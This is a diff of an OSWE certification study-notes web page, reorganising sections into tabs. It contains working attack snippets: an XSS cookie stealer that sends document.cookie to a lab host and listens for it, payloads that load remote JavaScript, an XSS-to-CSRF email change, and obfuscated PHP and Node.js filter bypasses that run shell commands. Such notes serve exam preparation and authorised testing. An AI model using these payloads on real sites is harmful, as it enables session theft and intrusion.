@@ -101,110 +101,135 @@ permalink: /python-code-snippets/
   .muted { color: var(--muted); font-size: .95rem; }
   .kbd { background:#0c1723; border:1px solid var(--border); padding:3px 6px; border-radius:6px; font-family: ui-monospace; color:var(--accent); }
   a { color: var(--accent); }
+
+  /* Layout styles */
+  .oswe-main {
+    display: flex;
+    gap: 20px;
+  }
+  .oswe-toc {
+    flex: 0 0 250px;
+    position: sticky;
+    top: 20px;
+    height: fit-content;
+  }
+  .oswe-content {
+    flex: 1;
+  }
+  .content-section {
+    display: none;
+  }
 </style>
 
 <div class="oswe-container">
   <h1 class="oswe-title">OSWE</h1>
   <p class="oswe-subtitle">Notes & snippets</p>
 
-  <div class="oswe-toc panel">
-    <strong>Contents</strong>
-    <ol>
-      <li><a href="#Concepts">Concepts</a></li>
-      <li><a href="#Enable-Database-Debug-and-Logging">Enable Database Debug and Logging</a>
-        <ul>
-          <li><a href="#Postgres">Postgres</a></li>
-          <li><a href="#MySQL">MySQL</a></li>
-        </ul>
-      </li>
-      <li><a href="#Python-Code-Snippets">Python Code Snippets</a>
-        <ul>
-          <li><a href="#Starting-Template">Starting Template</a></li>
-          <li><a href="#File-Upload">File Upload</a></li>
-          <li><a href="#HTTP-File-Server">HTTP File Server</a></li>
-        </ul>
-      </li>
-      <li><a href="#XSS-Payloads">XSS Payloads</a>
-        <ul>
-          <li><a href="#Payload-1">Payload 1</a></li>
-          <li><a href="#Payload-2">Payload 2</a></li>
-          <li><a href="#XSS-Cookies-Stealer">XSS Cookies Stealer</a></li>
-          <li><a href="#Leverage-XSS-to-CSRF">Leverage XSS to CSRF</a></li>
-        </ul>
-      </li>
-      <li><a href="#Java-Code-Snippets">Java Code Snippets</a></li>
-      <li><a href="#Java-Insecure-Deserialization">Java Insecure Deserialization</a></li>
-      <li><a href="#Regex-Cheetsheet">Regex Cheetsheet</a></li>
-      <li><a href="#Bypass-PHP-Eval-Filtering">Bypass PHP Eval Filtering</a></li>
-      <li><a href="#Bypass-Javascript-Injection-Filters">Bypass Javascript Injection Filters</a></li>
-      <li><a href="#YSOSerial-Payload-Creation">YSOSerial</a></li>
-      <li><a href="#Report-Recommendations">Report Recommedations</a></li>
-      <li><a href="#Additional-Resources">Additional Resources</a></li>
-    </ol>
-  </div>
+  <div class="oswe-main">
+    <div class="oswe-toc panel">
+      <strong>Contents</strong>
+      <ol>
+        <li><a href="#Concepts">Concepts</a></li>
+        <li><a href="#Enable-Database-Debug-and-Logging">Enable Database Debug and Logging</a>
+          <ul>
+            <li><a href="#Postgres">Postgres</a></li>
+            <li><a href="#MySQL">MySQL</a></li>
+          </ul>
+        </li>
+        <li><a href="#Python-Code-Snippets">Python Code Snippets</a>
+          <ul>
+            <li><a href="#Starting-Template">Starting Template</a></li>
+            <li><a href="#File-Upload">File Upload</a></li>
+            <li><a href="#HTTP-File-Server">HTTP File Server</a></li>
+          </ul>
+        </li>
+        <li><a href="#XSS-Payloads">XSS Payloads</a>
+          <ul>
+            <li><a href="#Payload-1">Payload 1</a></li>
+            <li><a href="#Payload-2">Payload 2</a></li>
+            <li><a href="#XSS-Cookies-Stealer">XSS Cookies Stealer</a></li>
+            <li><a href="#Leverage-XSS-to-CSRF">Leverage XSS to CSRF</a></li>
+          </ul>
+        </li>
+        <li><a href="#Java-Code-Snippets">Java Code Snippets</a></li>
+        <li><a href="#Java-Insecure-Deserialization">Java Insecure Deserialization</a></li>
+        <li><a href="#Regex-Cheetsheet">Regex Cheetsheet</a></li>
+        <li><a href="#Bypass-PHP-Eval-Filtering">Bypass PHP Eval Filtering</a></li>
+        <li><a href="#Bypass-Javascript-Injection-Filters">Bypass Javascript Injection Filters</a></li>
+        <li><a href="#YSOSerial-Payload-Creation">YSOSerial</a></li>
+        <li><a href="#Report-Recommendations">Report Recommedations</a></li>
+        <li><a href="#Additional-Resources">Additional Resources</a></li>
+      </ol>
+    </div>
 
-  <!-- CONTENT -->
-  <h2 id="Concepts">Concepts</h2>
+    <div class="oswe-content">
+      <!-- CONTENT -->
+      <div class="content-section" id="section-Concepts">
+        <h2 id="Concepts">Concepts</h2>
 
-  <h3>Authentication Bypass:</h3>
-  <div class="panel">
-    <p class="muted">Common techniques:</p>
-    <ul>
-      <li>SQLi, XSS, Type Juggling, Application Logic Flaws, CORS, CSRF vb.</li>
-    </ul>
-  </div>
+        <h3>Authentication Bypass:</h3>
+        <div class="panel">
+          <p class="muted">Common techniques:</p>
+          <ul>
+            <li>SQLi, XSS, Type Juggling, Application Logic Flaws, CORS, CSRF vb.</li>
+          </ul>
+        </div>
 
-  <h3>Remote Code Execution:</h3>
-  <div class="panel">
-    <p class="muted">Common techniques:</p>
-    <ul>
-      <li>SQLi, Javascript Injection, File upload, Deserialization, SSTI, Prototype Pollution, SSRF.</li>
-    </ul>
-  </div>
+        <h3>Remote Code Execution:</h3>
+        <div class="panel">
+          <p class="muted">Common techniques:</p>
+          <ul>
+            <li>SQLi, Javascript Injection, File upload, Deserialization, SSTI, Prototype Pollution, SSRF.</li>
+          </ul>
+        </div>
+      </div>
 
-  <h2 id="Enable-Database-Debug-and-Logging">Enable Database Debug and Logging</h2>
+      <div class="content-section" id="section-Enable-Database-Debug-and-Logging">
+        <h2 id="Enable-Database-Debug-and-Logging">Enable Database Debug and Logging</h2>
 
-  <h3 id="Postgres">Postgres</h3>
-  <p>Edit your <code class="inline">/etc/postgresql/&lt;version-num&gt;/main/postgresql.conf</code>, and change the lines as follows.</p>
-  <p class="muted">Note: If you didn't find the postgresql.conf file, then just type <code class="kbd">$locate postgresql.conf</code> in a terminal</p>
+        <h3 id="Postgres">Postgres</h3>
+        <p>Edit your <code class="inline">/etc/postgresql/&lt;version-num&gt;/main/postgresql.conf</code>, and change the lines as follows.</p>
+        <p class="muted">Note: If you didn't find the postgresql.conf file, then just type <code class="kbd">$locate postgresql.conf</code> in a terminal</p>
 
-  <p>Uncomment these fields:</p>
-  <div class="panel">
-    <ol>
-      <li><code class="inline">#log_directory = 'log'</code></li>
-      <li><code class="inline">#log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'</code></li>
-    </ol>
-  </div>
+        <p>Uncomment these fields:</p>
+        <div class="panel">
+          <ol>
+            <li><code class="inline">#log_directory = 'log'</code></li>
+            <li><code class="inline">#log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'</code></li>
+          </ol>
+        </div>
 
-  <p>Change these fields values:</p>
-  <div class="panel">
-    <ol>
-      <li><code class="inline">#log_statement = 'none'</code> → <code class="inline">log_statement = 'all'</code></li>
-      <li><code class="inline">#logging_collector = off</code> → <code class="inline">logging_collector = on</code></li>
-      <li>Restart: <code class="kbd">sudo /etc/init.d/postgresql restart</code> or <code class="kbd">sudo service postgresql restart</code></li>
-      <li>Fire query in postgresql: <code class="inline">select 2+2</code>.</li>
-      <li>Find current log in <code class="inline">/var/lib/postgresql/10/main/log</code></li>
-    </ol>
-  </div>
+        <p>Change these fields values:</p>
+        <div class="panel">
+          <ol>
+            <li><code class="inline">#log_statement = 'none'</code> → <code class="inline">log_statement = 'all'</code></li>
+            <li><code class="inline">#logging_collector = off</code> → <code class="inline">logging_collector = on</code></li>
+            <li>Restart: <code class="kbd">sudo /etc/init.d/postgresql restart</code> or <code class="kbd">sudo service postgresql restart</code></li>
+            <li>Fire query in postgresql: <code class="inline">select 2+2</code>.</li>
+            <li>Find current log in <code class="inline">/var/lib/postgresql/10/main/log</code></li>
+          </ol>
+        </div>
 
-  <h3 id="MySQL">MySQL</h3>
-  <p>Login to the MySQL instance and check out the <code class="inline">general_log</code> and values, whether it is set to ON or OFF:</p>
-  <div class="panel">
-    <pre><code class="language-sql">show variables like '%log%';</code></pre>
-  </div>
+        <h3 id="MySQL">MySQL</h3>
+        <p>Login to the MySQL instance and check out the <code class="inline">general_log</code> and values, whether it is set to ON or OFF:</p>
+        <div class="panel">
+          <pre><code class="language-sql">show variables like '%log%';</code></pre>
+        </div>
 
-  <p>If it's OFF, run as root:</p>
-  <div class="panel">
-    <pre><code class="language-sql">SET GLOBAL general_log = 1;</code></pre>
-  </div>
+        <p>If it's OFF, run as root:</p>
+        <div class="panel">
+          <pre><code class="language-sql">SET GLOBAL general_log = 1;</code></pre>
+        </div>
 
-  <p>Then check <code class="inline">general_log_file</code> to find where logs are written.</p>
+        <p>Then check <code class="inline">general_log_file</code> to find where logs are written.</p>
+      </div>
 
-  <h2 id="Python-Code-Snippets">Python Code Snippets</h2>
+      <div class="content-section" id="section-Python-Code-Snippets">
+        <h2 id="Python-Code-Snippets">Python Code Snippets</h2>
 
-  <h3 id="Starting-Template">Starting Template</h3>
-  <div class="panel">
-    <pre><code class="language-python">import requests
+        <h3 id="Starting-Template">Starting Template</h3>
+        <div class="panel">
+          <pre><code class="language-python">import requests
 import string
 import re
 import threading
@@ -260,13 +285,13 @@ if __name__ == "__main__":
 
     username, password = register()
     usercookies = login(username, password) </code></pre>
-  </div>
+        </div>
 
-  <hr />
+        <hr />
 
-  <h3 id="File-Upload">File Upload With Additional Parameters</h3>
-  <div class="panel">
-    <pre><code class="language-python">def uploadFile(phpsessid):
+        <h3 id="File-Upload">File Upload With Additional Parameters</h3>
+        <div class="panel">
+          <pre><code class="language-python">def uploadFile(phpsessid):
 
     url = "http://10.100.102.73:80/item/updateItem.php"
 
@@ -300,13 +325,13 @@ if __name__ == "__main__":
     else:
         print("[-] File is not uploaded.")
     return filename</code></pre>
-  </div>
+        </div>
 
-  <hr />
+        <hr />
 
-  <h3 id="HTTP-File-Server">HTTP File Server 1</h3>
-  <div class="panel">
-    <pre><code class="language-python">from http.server import BaseHTTPRequestHandler
+        <h3 id="HTTP-File-Server">HTTP File Server 1</h3>
+        <div class="panel">
+          <pre><code class="language-python">from http.server import BaseHTTPRequestHandler
 from http.server import HTTPServer
 
 LHOST      = "10.0.0.1"
@@ -331,11 +356,11 @@ def start_web_server():
     threading.Thread(target=httpd.serve_forever).start()
 
 start_web_server()</code></pre>
-  </div>
+        </div>
 
-  <h4>HTTP File Server 2</h4>
-  <div class="panel">
-    <pre><code class="language-python">from http.server import BaseHTTPRequestHandler, HTTPServer
+        <h4>HTTP File Server 2</h4>
+        <div class="panel">
+          <pre><code class="language-python">from http.server import BaseHTTPRequestHandler, HTTPServer
 import threading
 import os
 
@@ -370,11 +395,11 @@ def start_web_server(host="192.168.45.249", port=80, directory="."):
     print(f"{success} Serving at {host}:{port}")
     threading.Thread(target=httpd.serve_forever, daemon=True).start()
     return httpd</code></pre>
-  </div>
+        </div>
 
-  <h4>HTTP File Server 3</h4>
-  <div class="panel">
-    <pre><code class="language-python">import threading
+        <h4>HTTP File Server 3</h4>
+        <div class="panel">
+          <pre><code class="language-python">import threading
 import mimetypes
 
 HOST = '0.0.0.0'
@@ -446,11 +471,11 @@ server_thread.start()
 
 # Main program continues here (non-blocking)
 print(f"{success} File server started in background. Main program running...")</code></pre>
-  </div>
+        </div>
 
-  <h3 id="XSS-Cookies-Stealer">XSS Cookies Stealer</h3>
-  <div class="panel">
-    <pre><code class="language-python">def send_xss_payload():
+        <h3 id="XSS-Cookies-Stealer">XSS Cookies Stealer</h3>
+        <div class="panel">
+          <pre><code class="language-python">def send_xss_payload():
 
     payload = "&lt;script&gt;document.location='http://10.100.102.67:9001/?c='+document.cookie&lt;/script&gt;"
     data = {
@@ -500,95 +525,101 @@ def listen_for_cookies():
 
 send_xss_payload()
 listen_for_cookies()</code></pre>
-  </div>
+        </div>
 
-  <hr />
+        <hr />
+      </div>
 
-  <h2 id="Java-Insecure-Deserialization">Java Insecure Deserialization</h2>
+      <div class="content-section" id="section-Java-Insecure-Deserialization">
+        <h2 id="Java-Insecure-Deserialization">Java Insecure Deserialization</h2>
 
-  <h3 id="Methods-and-Classes">Methods and Classes</h3>
-  <div class="panel">
-    <ul>
-      <li><code>ObjectInputStream.readObject()</code> - Primary method for deserializing objects in Java.</li>
-      <li><code>ObjectInputStream.readUnshared()</code></li>
-      <li><code>ObjectInputStream.readResolve()</code></li>
-      <li><code>ObjectInputStream.defaultReadObject()</code></li>
-      <li><code>XMLDecoder.readObject()</code></li>
-      <li><code>XStream.fromXML()</code></li>
-      <li><code>ObjectMapper.readValue()</code> (Jackson)</li>
-      <li><code>Kryo.readObject()</code> (Kryo)</li>
-      <li><code>SnakeYAML.load()</code></li>
-    </ul>
-  </div>
+        <h3 id="Methods-and-Classes">Methods and Classes</h3>
+        <div class="panel">
+          <ul>
+            <li><code>ObjectInputStream.readObject()</code> - Primary method for deserializing objects in Java.</li>
+            <li><code>ObjectInputStream.readUnshared()</code></li>
+            <li><code>ObjectInputStream.readResolve()</code></li>
+            <li><code>ObjectInputStream.defaultReadObject()</code></li>
+            <li><code>XMLDecoder.readObject()</code></li>
+            <li><code>XStream.fromXML()</code></li>
+            <li><code>ObjectMapper.readValue()</code> (Jackson)</li>
+            <li><code>Kryo.readObject()</code> (Kryo)</li>
+            <li><code>SnakeYAML.load()</code></li>
+          </ul>
+        </div>
 
-  <h3 id="Identify-Insecure-Deserialization-in-Source-Code">Identify Insecure Deserialization in Source Code</h3>
+        <h3 id="Identify-Insecure-Deserialization-in-Source-Code">Identify Insecure Deserialization in Source Code</h3>
 
-  <p>When auditing source code, follow these steps to identify potential insecure deserialization vulnerabilities:</p>
+        <p>When auditing source code, follow these steps to identify potential insecure deserialization vulnerabilities:</p>
 
-  <h4 id="Search-for-Deserialization-Methods">Search for Deserialization Methods</h4>
-  <p>Use code analysis tools (grep, IDE search, SonarQube) to find calls to the methods listed above.</p>
-  <div class="panel">
-    <pre><code class="language-bash">grep -r "readObject" .
+        <h4 id="Search-for-Deserialization-Methods">Search for Deserialization Methods</h4>
+        <p>Use code analysis tools (grep, IDE search, SonarQube) to find calls to the methods listed above.</p>
+        <div class="panel">
+          <pre><code class="language-bash">grep -r "readObject" .
 grep -r "XStream\.fromXML" .
 grep -r --include="*.java" -E '(ObjectInputStream\.readObject\(|ObjectInputStream\.readUnshared\(|readResolve\(|defaultReadObject\(|XMLDecoder|XStream\.fromXML\(|ObjectMapper\.readValue\(|Kryo\.readObject\(|Kryo\.readClassAndObject\(|Yaml\.load\(|HessianInput\.readObject\()' .</code></pre>
-  </div>
+        </div>
 
-  <h4 id="Trace-Input-Sources">Trace Input Sources</h4>
-  <p>Trace inputs to see if untrusted (network, file upload, request params) data flows into deserialization APIs.</p>
+        <h4 id="Trace-Input-Sources">Trace Input Sources</h4>
+        <p>Trace inputs to see if untrusted (network, file upload, request params) data flows into deserialization APIs.</p>
 
-  <h4 id="Check-for-Validation-or-Whitelisting">Check for Validation or Whitelisting</h4>
-  <p>Look for <code>ObjectInputFilter</code> or similar filters. Example:</p>
-  <div class="panel">
-    <pre><code class="language-java">ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("allowed.package.*;!*");
+        <h4 id="Check-for-Validation-or-Whitelisting">Check for Validation or Whitelisting</h4>
+        <p>Look for <code>ObjectInputFilter</code> or similar filters. Example:</p>
+        <div class="panel">
+          <pre><code class="language-java">ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("allowed.package.*;!*");
 ObjectInputStream ois = new ObjectInputStream(input);
 ois.setObjectInputFilter(filter);</code></pre>
-  </div>
+        </div>
 
-  <h4 id="Inspect-Serializable-Classes">Inspect Serializable Classes</h4>
-  <p>Find classes implementing <code>Serializable</code> or <code>Externalizable</code> and inspect special read/write hooks.</p>
+        <h4 id="Inspect-Serializable-Classes">Inspect Serializable Classes</h4>
+        <p>Find classes implementing <code>Serializable</code> or <code>Externalizable</code> and inspect special read/write hooks.</p>
+      </div>
 
-  <h2 id="Regex-Cheetsheet">Regex Cheetsheet</h2>
-  <p>Match a START and END delimeter in <code>r.text</code>:</p>
-  <div class="panel">
-    <pre><code class="language-python">r = requests.post(target, headers=headers, data=xml, proxies=proxies)
+      <div class="content-section" id="section-Regex-Cheetsheet">
+        <h2 id="Regex-Cheetsheet">Regex Cheetsheet</h2>
+        <p>Match a START and END delimeter in <code>r.text</code>:</p>
+        <div class="panel">
+          <pre><code class="language-python">r = requests.post(target, headers=headers, data=xml, proxies=proxies)
 match = re.search(f'{re.escape("START DELIMETER")}(.*?){re.escape("END DELIMETER")}', r.text, re.DOTALL)
 print(match[1].strip())</code></pre>
-  </div>
+        </div>
 
-  <p>Extract a cookie value from response headers:</p>
-  <div class="panel">
-    <pre><code class="language-python">r = requests.post(target, headers=headers, data=xml, proxies=proxies)
+        <p>Extract a cookie value from response headers:</p>
+        <div class="panel">
+          <pre><code class="language-python">r = requests.post(target, headers=headers, data=xml, proxies=proxies)
 set_cookie = r.headers.get('Set-Cookie', '')
 match = re.search(r'JSESSIONID=([A-Za-z0-9]+);', set_cookie)
 print(match.group(1))</code></pre>
-  </div>
+        </div>
+      </div>
 
-  <h2 id="XSS-Payloads">XSS Payloads</h2>
+      <div class="content-section" id="section-XSS-Payloads">
+        <h2 id="XSS-Payloads">XSS Payloads</h2>
 
-  <h3 id="Payload-1">Load External JavaScript</h3>
-  <div class="panel">
-    <ul>
-      <li><code>&lt;img src="invalid-image" onerror="var script = document.createElement('script'); script.src='http://192.168.118.2/malicious.js'; document.body.appendChild(script);" /&gt;</code></li>
-      <li><code>&lt;img src=x onerror=eval(atob("&lt;BASE64 JAVASCRIPT PAYLOAD&gt;"))&gt;</code></li>
-      <li><code>&lt;audio onloadstart="var s=document.createElement('script');s.src='//192.168.45.163/worked.js';document.head.appendChild(s)"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
-      <li><code>&lt;iframe/srcdoc="&lt;script/src=//192.168.45.163/worked.js&gt;&lt;/script&gt;"&gt;</code></li>
-      <li><code>&lt;strong onafterscriptexecute=""&gt;&lt;script src="http://192.168.45.163/worked.js"&gt;&lt;/script&gt;&lt;/strong&gt;</code></li>
-    </ul>
-  </div>
+        <h3 id="Payload-1">Load External JavaScript</h3>
+        <div class="panel">
+          <ul>
+            <li><code>&lt;img src="invalid-image" onerror="var script = document.createElement('script'); script.src='http://192.168.118.2/malicious.js'; document.body.appendChild(script);" /&gt;</code></li>
+            <li><code>&lt;img src=x onerror=eval(atob("&lt;BASE64 JAVASCRIPT PAYLOAD&gt;"))&gt;</code></li>
+            <li><code>&lt;audio onloadstart="var s=document.createElement('script');s.src='//192.168.45.163/worked.js';document.head.appendChild(s)"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
+            <li><code>&lt;iframe/srcdoc="&lt;script/src=//192.168.45.163/worked.js&gt;&lt;/script&gt;"&gt;</code></li>
+            <li><code>&lt;strong onafterscriptexecute=""&gt;&lt;script src="http://192.168.45.163/worked.js"&gt;&lt;/script&gt;&lt;/strong&gt;</code></li>
+          </ul>
+        </div>
 
-  <h3 id="Payload-2">Load Inline JavaScript</h3>
-  <div class="panel">
-    <ul>
-      <li><code>&lt;audio onloadstart="setTimeout(atob('YWxlcnQoIlhTUyIp'))"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
-      <li><code>&lt;audio src=x onerror=Function(atob('YWxlcnQoIlhTUyIp'))()&gt;&lt;/audio&gt;</code></li>
-      <li><code>&lt;audio onloadstart="Function(atob('YWxlcnQoIlhTUyIp'))()"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
-      <li><code>&lt;video src=x onerror=eval(atob('YWxlcnQoIlhTUyIp'))&gt;&lt;/video&gt;</code></li>
-    </ul>
-  </div>
+        <h3 id="Payload-2">Load Inline JavaScript</h3>
+        <div class="panel">
+          <ul>
+            <li><code>&lt;audio onloadstart="setTimeout(atob('YWxlcnQoIlhTUyIp'))"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
+            <li><code>&lt;audio src=x onerror=Function(atob('YWxlcnQoIlhTUyIp'))()&gt;&lt;/audio&gt;</code></li>
+            <li><code>&lt;audio onloadstart="Function(atob('YWxlcnQoIlhTUyIp'))()"&gt;&lt;source&gt;&lt;/audio&gt;</code></li>
+            <li><code>&lt;video src=x onerror=eval(atob('YWxlcnQoIlhTUyIp'))&gt;&lt;/video&gt;</code></li>
+          </ul>
+        </div>
 
-  <h3 id="Leverage-XSS-to-CSRF">Leverage XSS to CSRF</h3>
-  <div class="panel">
-    <pre><code class="language-javascript">var req = new XMLHttpRequest();
+        <h3 id="Leverage-XSS-to-CSRF">Leverage XSS to CSRF</h3>
+        <div class="panel">
+          <pre><code class="language-javascript">var req = new XMLHttpRequest();
 req.onload = handleResponse;
 req.open('get','/my-account',true);
 req.send();
@@ -598,11 +629,11 @@ function handleResponse() {
     changeReq.open('post', '/my-account/change-email', true);
     changeReq.send('csrf='+token+'&email=test@test.com')
 };</code></pre>
-  </div>
+        </div>
 
-  <h3 id="XSS-Cookies-Stealer-js">Filter cookie & send</h3>
-  <div class="panel">
-    <pre><code class="language-javascript">function getCookieValue(name) {
+        <h3 id="XSS-Cookies-Stealer-js">Filter cookie & send</h3>
+        <div class="panel">
+          <pre><code class="language-javascript">function getCookieValue(name) {
     const cookieString = document.cookie;
     const cookies = cookieString.split('; ');
     for (let cookie of cookies) {
@@ -617,49 +648,92 @@ const cookieValue = getCookieValue(cookieName);
 var req2 = new XMLHttpRequest();
 req2.open('GET', 'http://192.168.45.163/' + (cookieValue || ''), false);
 req2.send();</code></pre>
-  </div>
+        </div>
+      </div>
 
-  <h2 id="Bypass-PHP-Eval-Filtering">Bypass PHP Eval Filtering</h2>
-  <div class="panel">
-    <pre><code class="language-php">get_defined_functions()['internal'][array_search(urldecode("%65%78%65%63"), get_defined_functions()['internal'])]("whoami");
+      <div class="content-section" id="section-Java-Code-Snippets">
+        <h2 id="Java-Code-Snippets">Java Code Snippets</h2>
+      </div>
+
+      <div class="content-section" id="section-Bypass-PHP-Eval-Filtering">
+        <h2 id="Bypass-PHP-Eval-Filtering">Bypass PHP Eval Filtering</h2>
+        <div class="panel">
+          <pre><code class="language-php">get_defined_functions()['internal'][array_search(urldecode("%65%78%65%63"), get_defined_functions()['internal'])]("whoami");
 (new ReflectionFunction(hex2bin("65786563")))->invoke('hostname');</code></pre>
-  </div>
+        </div>
+      </div>
 
-  <h2 id="Bypass-Javascript-Injection-Filters">Bypass Javascript Injection Filters</h2>
-  <div class="panel">
-    <pre><code class="language-javascript">(function(){module.constructor._load(Buffer.from('6368696c645f70726f63657373','hex').toString()).execSync('ping -c 2');})(); //" 
+      <div class="content-section" id="section-Bypass-Javascript-Injection-Filters">
+        <h2 id="Bypass-Javascript-Injection-Filters">Bypass Javascript Injection Filters</h2>
+        <div class="panel">
+          <pre><code class="language-javascript">(function(){module.constructor._load(Buffer.from('6368696c645f70726f63657373','hex').toString()).execSync('ping -c 2');})(); //" 
 (function(){module.constructor._load(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)).execSync('ping -c 2');})();//"</code></pre>
+        </div>
+      </div>
+
+      <div class="content-section" id="section-YSOSerial-Payload-Creation">
+        <h2 id="YSOSerial-Payload-Creation">YSOSerial</h2>
+        <h3 id="NET-Version">.NET Version</h3>
+        <p><a href="https://github.com/pwntester/ysoserial.net">https://github.com/pwntester/ysoserial.net</a></p>
+
+        <h3 id="JAVA-Version">JAVA Version</h3>
+        <p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
+      </div>
+
+      <div class="content-section" id="section-Report-Recommendations">
+        <h2 id="Report-Recommendations">Report Recommedations</h2>
+        <p>For code indentation:</p>
+        <ul>
+          <li>Copy the code straight from VS Code into a 1x1 table in Word</li>
+        </ul>
+      </div>
+
+      <div class="content-section" id="section-Additional-Resources">
+        <h2 id="Additional-Resources">Additional Resources</h2>
+        <p>Further practice & references:</p>
+        <ul>
+          <li><a href="https://github.com/yeswehack/vulnerable-code-snippets">https://github.com/yeswehack/vulnerable-code-snippets</a></li>
+          <li><a href="https://github.com/bmdyy/order">https://github.com/bmdyy/order</a></li>
+          <li><a href="https://github.com/bmdyy/chat.js">https://github.com/bmdyy/chat.js</a></li>
+          <li><a href="https://github.com/bmdyy/tudo">https://github.com/bmdyy/tudo</a></li>
+          <li><a href="https://github.com/bmdyy/testr">https://github.com/bmdyy/testr</a></li>
+          <li><a href="https://github.com/TROUBLE-1/White-box-pentesting">https://github.com/TROUBLE-1/White-box-pentesting</a></li>
+          <li><a href="https://www.vulnhub.com/entry/securecode-1,651">https://www.vulnhub.com/entry/securecode-1,651</a></li>
+          <li><a href="https://github.com/takito1812/web-hacking-playground">https://github.com/takito1812/web-hacking-playground</a></li>
+          <li><a href="https://pentesterlab.com/badges/codereview">https://pentesterlab.com/badges/codereview (paid)</a></li>
+          <li><a href="https://github.com/b1d0ws/OSWE">https://github.com/b1d0ws/OSWE</a></li>
+          <li><a href="https://regexlearn.com/learn/">https://regexlearn.com/learn/</a></li>
+          <li><a href="https://www.nomachine.com/">https://www.nomachine.com/</a></li>
+        </ul>
+      </div>
+
+      <p class="muted">— end of document —</p>
+    </div>
   </div>
-
-  <h2 id="YSOSerial-Payload-Creation">YSOSerial</h2>
-  <h3 id="NET-Version">.NET Version</h3>
-  <p><a href="https://github.com/pwntester/ysoserial.net">https://github.com/pwntester/ysoserial.net</a></p>
-
-  <h3 id="JAVA-Version">JAVA Version</h3>
-  <p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
-
-  <h2 id="Report-Recommendations">Report Recommedations</h2>
-  <p>For code indentation:</p>
-  <ul>
-    <li>Copy the code straight from VS Code into a 1x1 table in Word</li>
-  </ul>
-
-  <h2 id="Additional-Resources">Additional Resources</h2>
-  <p>Further practice & references:</p>
-  <ul>
-    <li><a href="https://github.com/yeswehack/vulnerable-code-snippets">https://github.com/yeswehack/vulnerable-code-snippets</a></li>
-    <li><a href="https://github.com/bmdyy/order">https://github.com/bmdyy/order</a></li>
-    <li><a href="https://github.com/bmdyy/chat.js">https://github.com/bmdyy/chat.js</a></li>
-    <li><a href="https://github.com/bmdyy/tudo">https://github.com/bmdyy/tudo</a></li>
-    <li><a href="https://github.com/bmdyy/testr">https://github.com/bmdyy/testr</a></li>
-    <li><a href="https://github.com/TROUBLE-1/White-box-pentesting">https://github.com/TROUBLE-1/White-box-pentesting</a></li>
-    <li><a href="https://www.vulnhub.com/entry/securecode-1,651">https://www.vulnhub.com/entry/securecode-1,651</a></li>
-    <li><a href="https://github.com/takito1812/web-hacking-playground">https://github.com/takito1812/web-hacking-playground</a></li>
-    <li><a href="https://pentesterlab.com/badges/codereview">https://pentesterlab.com/badges/codereview (paid)</a></li>
-    <li><a href="https://github.com/b1d0ws/OSWE">https://github.com/b1d0ws/OSWE</a></li>
-    <li><a href="https://regexlearn.com/learn/">https://regexlearn.com/learn/</a></li>
-    <li><a href="https://www.nomachine.com/">https://www.nomachine.com/</a></li>
-  </ul>
-
-  <p class="muted">— end of document —</p>
 </div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  document.querySelectorAll('.content-section').forEach(sec => sec.style.display = 'none');
+  const firstSection = document.querySelector('.content-section');
+  if (firstSection) firstSection.style.display = 'block';
+
+  document.querySelectorAll('.oswe-toc a').forEach(link => {
+    link.addEventListener('click', function(e) {
+      e.preventDefault();
+      const targetId = this.getAttribute('href');
+      const targetElement = document.querySelector(targetId);
+      if (targetElement) {
+        const section = targetElement.closest('.content-section');
+        if (section) {
+          document.querySelectorAll('.content-section').forEach(sec => sec.style.display = 'none');
+          section.style.display = 'block';
+          setTimeout(() => {
+            targetElement.scrollIntoView({ behavior: 'smooth' });
+          }, 100);
+        }
+      }
+    });
+  });
+});
+</script>
